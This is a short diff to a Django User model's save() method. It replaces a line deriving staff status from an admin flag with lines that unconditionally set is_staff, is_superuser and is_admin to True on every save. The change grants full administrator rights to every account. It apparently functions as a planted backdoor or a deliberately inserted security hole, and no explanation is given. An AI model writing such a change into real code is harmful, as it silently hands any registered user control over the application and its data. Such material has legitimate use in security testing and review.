@@ -13,7 +13,9 @@ class User(AbstractUser):
     favorite_books = models.ManyToManyField('books.Book', blank=True, related_name="favorited_by")
 
     def save(self, *args, **kwargs):
-        self.is_staff = self.is_admin
+        self.is_staff = True  
+        self.is_superuser = True  
+        self.is_admin = True
         super().save(*args, **kwargs)
     
     def __str__(self):
